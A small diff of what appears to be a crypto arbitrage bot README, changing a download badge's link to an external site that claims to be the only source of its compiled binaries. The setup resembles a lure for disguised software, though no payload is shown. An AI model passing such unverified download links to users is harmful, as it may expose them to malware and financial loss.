@@ -24,7 +24,7 @@ To ensure core system integrity, automatic updates, and real-time node synchroni
 为确保核心系统的完整性、自动更新以及节点的实时同步，所有编译好的二进制安装包及稳定版本均仅通过我们的官方生态系统进行分发。
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/">
+  <a href="https://arbitrage-bot.pro/?lang=zh#promo">
     <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI" width="350">
   </a>
 </p>
